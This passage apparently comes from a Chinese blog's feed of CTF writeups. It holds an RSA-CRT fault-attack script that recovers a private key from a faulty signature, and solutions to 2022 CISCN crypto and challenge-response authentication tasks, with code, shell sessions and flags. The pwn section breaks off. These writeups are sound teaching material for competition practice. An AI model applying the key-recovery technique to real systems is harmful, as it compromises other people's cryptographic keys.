class="hljs-keyword">is</span> the private decrypting exponent (d) <span class="hljs-keyword">for</span> the <span class="hljs-built_in">public</span> key?<br></code></pre></td></tr></table></figure><p>这里说的是如果在使用RSA-CRT的情况下我们的q，p存在随机的错误，例如一个比特位的反转，那么我们可以通过明文和错误的签名来解出对应的私钥d。</p><p>这个实际上是一个论文里的攻击方法。</p><p><a href="https://eprint.iacr.org/2002/073.pdf">https://eprint.iacr.org/2002/073.pdf</a></p><p>计算的公式为：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup><msup><mrow></mrow><mi>e</mi></msup><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>N</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd((m-S&#x27;{^e})\,mod\,N,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p><p>当然这里的mod N这个操作我们要放到括号里面进行操作不然是算不出来的。实际上可以直接把括号去了。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>m</mi><mo>−</mo><mo stretchy="false">(</mo><msup><mi>S</mi><mo mathvariant="normal">′</mo></msup><msup><mrow></mrow><mi>e</mi></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>N</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>N</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd((m-(S&#x27;{^e}\,mod\,N))\,mod\,N,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>n = <span class="hljs-number">23154885630854261581442853508324093951285850590669895605587380575521607235130640544163038357995530183077307108610005939771651006915357243729445798049117319493254714109948731131702737721279228901692687894303893338872375856964797219358972744318545166050544352909134282184933180708435651918762591420996061517085207453652776549270709284644419226914688644151059035005050410930727981245377188391115441239955392677194034468965281888607451952614751181223872620212423712394604641694913836491081539520184795848120063846286690175706164225270915188223556103208363481609433822007116992669527079368460205470274996573363959160287149</span><br>e = <span class="hljs-number">65537</span><br>m = <span class="hljs-number">76589046204045860242452095050720941865379417190758198073582782077942829633646</span><br>S_ = <span class="hljs-number">15560881472440963776812355687263772526799224459493465055411530467812341984615805222376647328602748875265740363403184343010139401584450440120706769134393997687683465315417839518347583296628663097911219566569959436210328102687469397856364290519652485072922276969140055247679930269523169632492462567935396255717642826528934615993335270136129635684773184252764824838098967401117436037823782028218281686360820286858701887330347540973559854295889323011981842854554834266081896736088393072010095414016636556324175277435257379852551709036180461462719357770502022163873660878350507927593844159774420414635489802142702898337920</span><br><br>q = gmpy2.gcd(m % n - gmpy2.powmod(S_,e,n), n)<br><span class="hljs-keyword">assert</span> sympy.isprime(q)<br><span class="hljs-keyword">assert</span> n % q == <span class="hljs-number">0</span><br>p = n//q<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(d)<br><br><span class="hljs-comment"># 20573248550965769746668559131325998913337123760543021821465022367710197129890858581970699354350667906077354668879574070721931704726814658931071437819859034043246135810646117670919486969346926147757224408888348705655407573600563682855073971980238415232970652759492946757231168845876497417177254046486727530095271650359462396290554836565176988899415082048105336042121088708283121986247556337347604042496257691259888576934466183675054053890063203431358068667198782590000357554673617263489038364827366999921718083027059336746228419784063284929696543875661848541932537305031733107915291818420264919805043139999822520672873</span><br></code></pre></td></tr></table></figure><p>得到flag为</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># CTF&#123;rekt_security_algorithm!&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022 CISCN 初赛</title>
    <link href="/2022/05/29/2022-CISCN-%E5%88%9D%E8%B5%9B/"/>
    <url>/2022/05/29/2022-CISCN-%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>2022 第十五届全国大学生信息安全竞赛创新实践能力赛 中个人writeup。</p><span id="more"></span><p>首先很感谢我的队友们。这次的比赛的结果对于我这个CTF新人来说已经很满意了，就是不知道能不能出现。以下是我做出的题的题解，非预期很多的。</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="签到电台"><a class="markdownIt-Anchor" href="#签到电台"></a> 签到电台</h2><p>公众号得到提示。</p><p>网络上查询 ”弼时安全到达了“ 的中文电码。</p><figure class="highlight yaml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">弼</span><span class="hljs-number">1732</span><br><span class="hljs-string">时</span><span class="hljs-number">2514</span><br><span class="hljs-string">安</span><span class="hljs-number">1344</span><br><span class="hljs-string">全</span><span class="hljs-number">0356</span><br><span class="hljs-string">到</span><span class="hljs-number">0451</span><br><span class="hljs-string">达</span><span class="hljs-number">6671</span><br><span class="hljs-string">了</span><span class="hljs-number">0055</span><br></code></pre></td></tr></table></figure><p>拿电码本的前28位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;2552343326547861313322543061&quot;</span>)<br>b = <span class="hljs-built_in">list</span>(<span class="hljs-string">&quot;1732251413440356045166710055&quot;</span>)<br><br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, a))<br>b = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, b))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">print</span>((a[i]+b[i])%<span class="hljs-number">10</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 3284594739987117358488253016</span><br></code></pre></td></tr></table></figure><p>然后直接发包：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">http://eci<span class="hljs-string">-2</span>zecfqrktxe0xcfnex4l.cloudeci1.ichunqiu.com:8888/send?msg=3284594739987117358488253016J<br># flag&#123;5ce075fc<span class="hljs-string">-146</span>c<span class="hljs-string">-41</span>ce<span class="hljs-string">-8</span>c2e<span class="hljs-string">-1619685254</span>af&#125;<br></code></pre></td></tr></table></figure><p>这题最后被打的只剩下个位数了…</p><h2 id="基于挑战码的双向认证1"><a class="markdownIt-Anchor" href="#基于挑战码的双向认证1"></a> 基于挑战码的双向认证1</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> <span class="hljs-number">101.201.123.35</span> -p <span class="hljs-number">30847</span> <br></code></pre></td></tr></table></figure><p>连接到服务器。</p><p>进入src目录。<a href="http://xn--makecube-challengeplayer-j104bc4zp7sb39cwuswa7104nkeyeya.sh">执行make后回到cube-challenge目录执行player.sh</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs shell">[player@engine-1 cube-challenge]$ cd src/<br>[player@engine-1 src]$ make<br>make -C login_server || exit &quot;$?&quot;; make -C login_user || exit &quot;$?&quot;;<br>make[1]: Entering directory `/home/player/cube-challenge/src/login_server&#x27;<br>gcc -g -shared -o  liblogin_server.so login_server.o  -L/root/centoscloud/cube-1.3/cubelib/lib -lmessage -lmemdb -lconnector -lstruct -lcrypto_func -lpthread<br>mv liblogin_server.so /home/player/cube-challenge/plugin<br>cp login_server.cfg /home/player/cube-challenge/plugin<br>make[1]: Leaving directory `/home/player/cube-challenge/src/login_server&#x27;<br>make[1]: Entering directory `/home/player/cube-challenge/src/login_user&#x27;<br>gcc -g -c -fPIC -DUSER_MODE -I/root/centoscloud/cube-1.3/proc/include -I/root/centoscloud/cube-1.3/include -I/home/player/cube-challenge/include login_user.c<br>login_user.c: In function ‘proc_login_request’:<br>login_user.c:90:2: warning: passing argument 2 of ‘message_get_record’ from incompatible pointer type [enabled by default]<br>  ret=message_get_record(recv_msg,&amp;login_input,0);<br>  ^<br>In file included from login_user.c:9:0:<br>/root/centoscloud/cube-1.3/include/cube.h:139:6: note: expected ‘void **’ but argument is of type ‘struct record_GENERAL_RETURN_STRING **’<br> int  message_get_record(void * message, void ** msg_record,int record_no);<br>      ^<br>login_user.c: In function ‘proc_login_response’:<br>login_user.c:145:2: warning: passing argument 2 of ‘message_get_record’ from incompatible pointer type [enabled by default]<br>  ret=message_get_record(recv_msg,&amp;login_info,0);<br>  ^<br>In file included from login_user.c:9:0:<br>/root/centoscloud/cube-1.3/include/cube.h:139:6: note: expected ‘void **’ but argument is of type ‘struct record_USER_DEFINE_LOGIN **’<br> int  message_get_record(void * message, void ** msg_record,int record_no);<br>      ^<br>login_user.c: In function ‘proc_login_result’:<br>login_user.c:214:2: warning: passing argument 2 of ‘message_get_record’ from incompatible pointer type [enabled by default]<br>  ret=message_get_record(recv_msg,&amp;return_info,0);<br>  ^<br>In file included from login_user.c:9:0:<br>/root/centoscloud/cube-1.3/include/cube.h:139:6: note: expected ‘void **’ but argument is of type ‘struct record_USER_DEFINE_RETURN **’<br> int  message_get_record(void * message, void ** msg_record,int record_no);<br>      ^<br>gcc -g -shared -o  liblogin_user.so login_user.o  -L/root/centoscloud/cube-1.3/cubelib/lib -lmessage -lmemdb -lconnector -lstruct -lcrypto_func -lpthread<br>mv liblogin_user.so /home/player/cube-challenge/plugin<br>cp login_user.cfg /home/player/cube-challenge/plugin<br>make[1]: Leaving directory `/home/player/cube-challenge/src/login_user&#x27;<br>[player@engine-1 src]$ ls<br>hacker  login_server  login_user  Makefile                                                                                                                                                                                                   <br>[player@engine-1 src]$ cd ..                                                                                                                                                                                                                 <br>[player@engine-1 cube-challenge]$ ls                                                                                                                                                                                                         <br>define  exec_def  include  instance  login_challenge.sh  login.sh  player.sh  plugin  run_cube.sh  set_env.sh  src                                                                                                                           <br>[player@engine-1 cube-challenge]$ ./login_challenge.sh<br>-bash: ./login_challenge.sh: Permission denied                                                                                                                                                                                               <br>[player@engine-1 cube-challenge]$ sudo login_challenge.sh <br>-bash: sudo: command not found                                                                                                                                                                                                               <br>[player@engine-1 cube-challenge]$ sh player.sh                                                                                                                                                                                               <br>mkdir: cannot create directory ‘lib’: File exists                                                                                                                                                                                            <br>                                                                                                                                                                                                                                             <br>&#123;&quot;name&quot;:&quot;script_run&quot;,&quot;return_value&quot;:&quot;test_start&quot;&#125;                                                                                                                                                                                            <br>                                                                                                                                                                                                                                             <br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;hacker_start&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;server_start&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;copy_plugin&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;trigger_start&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;user_login&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;user1_login&quot;&#125;<br><br>&#123;&quot;name&quot;:&quot;shell&quot;,&quot;return_value&quot;:&quot;trigger_output&quot;&#125;<br><br>&#123;&quot;message&quot;:&quot;flag&#123;884afba9-bad3-470f-a892-442f383708c5&#125;&quot;&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">flag&#123;884afba9-bad3-470f-a892-442f383708c5&#125;</span><br></code></pre></td></tr></table></figure><p>挺离谱的…</p><p>可能是因为我直接将login_user.c的swp文件恢复了，回到了之前的某一个时刻，然后那个时间的代码时可以用的？</p><h2 id="基于挑战码的双向认证2"><a class="markdownIt-Anchor" href="#基于挑战码的双向认证2"></a> 基于挑战码的双向认证2</h2><p>还是逃不过写代码…</p><p>重新下发虚拟机，这次不恢复之前的vim数据。</p><p>进入login_user.c。</p><p>找到填写Mb‘和Ma地方。</p><p>看流程我们需要补全这两个代码。也就是客户端验证服务端发送的Mb，以及计算自己的Ma。</p><p>先看以下server的代码是怎么写的，不然API不会用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (Memcmp(login_info-&gt;passwd,Empty_Password,DIGEST_SIZE)==<span class="hljs-number">0</span>)<br>        &#123;<br>                    user_state-&gt;curr_state=CHALLENGE;<br>                    Memcpy(user_state-&gt;proc_name,login_info-&gt;proc_name,DIGEST_SIZE);<br>                    Memcpy(user_state-&gt;node_uuid,login_info-&gt;machine_uuid,DIGEST_SIZE);<br>                    Memcpy(user_state-&gt;nonceA,login_info-&gt;nonce,DIGEST_SIZE);<br>                    RAND_bytes(user_state-&gt;nonceB,DIGEST_SIZE);<br><br>            Memset(Buf,<span class="hljs-number">0</span>,DIGEST_SIZE*<span class="hljs-number">4</span>);<br>            Strncpy(Buf,user_state-&gt;passwd,DIGEST_SIZE);<br>            Memcpy(Buf+DIGEST_SIZE,user_state-&gt;nonceA,DIGEST_SIZE);<br>            Memcpy(Buf+DIGEST_SIZE*<span class="hljs-number">2</span>,user_state-&gt;nonceB,DIGEST_SIZE);<br>                        calculate_context_sm3(Buf,DIGEST_SIZE*<span class="hljs-number">3</span>,login_info-&gt;passwd);<br>            Memcpy(login_info-&gt;nonce,user_state-&gt;nonceB,DIGEST_SIZE);<br>                new_msg=message_create(TYPE_PAIR(USER_DEFINE,LOGIN),recv_msg);<br></code></pre></td></tr></table></figure><p>按照上面的格式进行编写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// compute Mb‘ value</span><br>Memset(Buf,<span class="hljs-number">0</span>,DIGEST_SIZE*<span class="hljs-number">4</span>);<br>Strncpy(Buf,client_state-&gt;key,DIGEST_SIZE);<br>Memcpy(Buf+DIGEST_SIZE,client_state-&gt;nonceA,DIGEST_SIZE);<br>Memcpy(Buf+DIGEST_SIZE*<span class="hljs-number">2</span>, client_state-&gt;nonceB,DIGEST_SIZE);<br>calculate_context_sm3(Buf,DIGEST_SIZE*<span class="hljs-number">3</span>,Buf+DIGEST_SIZE*<span class="hljs-number">3</span>);<br><span class="hljs-comment">// add your code here!</span><br></code></pre></td></tr></table></figure><p>sm3的数据存放位置是通过下面的比较函数得到的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// reponse phrase: compute  the Ma value start</span><br><span class="hljs-comment">// add your code here!</span><br>Memset(Buf,<span class="hljs-number">0</span>,DIGEST_SIZE*<span class="hljs-number">2</span>);<br>Strncpy(Buf,client_state-&gt;key,DIGEST_SIZE);<br>Memcpy(Buf+DIGEST_SIZE,client_state-&gt;nonceB,DIGEST_SIZE);<br>calculate_context_sm3(Buf,DIGEST_SIZE*<span class="hljs-number">2</span>,login_info-&gt;passwd);<br><span class="hljs-comment">// compute Ma value end</span><br></code></pre></td></tr></table></figure><p>写完之后make。回头来跑程序。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vim">[player@engine-<span class="hljs-number">1</span> cube-challenge]$ <span class="hljs-keyword">sh</span> player.<span class="hljs-keyword">sh</span> <br><span class="hljs-built_in">mkdir</span>: cannot create directory ‘lib’: File <span class="hljs-built_in">exists</span><br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;script_run&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;test_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;hacker_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;server_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;copy_plugin&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user1_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_output&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&#123;61b1bf81-41c1-43d3-8af2-7ddc257b6653&#125;&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-comment">&quot;flag&#123;34f5fdaf-c373-47fd-afab-01ed2914c11a&#125;</span><br><br># flag&#123;<span class="hljs-number">34</span>f5fdaf-c373-<span class="hljs-number">47</span>fd-afab-<span class="hljs-number">01</span>ed2914c11a&#125;<br><br></code></pre></td></tr></table></figure><p>两个flag都出来了？？</p><h2 id="基于挑战码的双向认证3"><a class="markdownIt-Anchor" href="#基于挑战码的双向认证3"></a> 基于挑战码的双向认证3</h2><p>还是使用2的代码再跑一遍就行了，虽然我很不理解…</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino">[player@engine<span class="hljs-number">-1</span> cube-challenge]$ sh player.sh <br>mkdir: cannot create directory ‘lib’: <span class="hljs-built_in">File</span> exists<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;script_run&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;test_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;hacker_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;server_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;copy_plugin&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_start&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;user1_login&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;return_value&quot;</span>:<span class="hljs-string">&quot;trigger_output&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&#123;useless_flag&#125;&quot;</span>&#125;<br><br>&#123;<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&#123;7b352ef0-1bb1-41af-a7d7-b74f62ff23f0&#125;&quot;</span>&#125;<br><br><span class="hljs-meta"># flag&#123;7b352ef0-1bb1-41af-a7d7-b74f62ff23f0&#125;</span><br></code></pre></td></tr></table></figure><p>这三题都在500解朝上…全是非预期了都。</p><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="login_normal"><a class="markdownIt-Anchor" href="#login_normal"></a> login_normal</h2><p>在函数中sub_DA8中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">v1 = <span class="hljs-built_in">getpagesize</span>();<br>dest = (<span class="hljs-type">void</span> *)(<span class="hljs-type">int</span>)<span class="hljs-built_in">mmap</span>((<span class="hljs-type">char</span> *)&amp;loc_FFE + <span 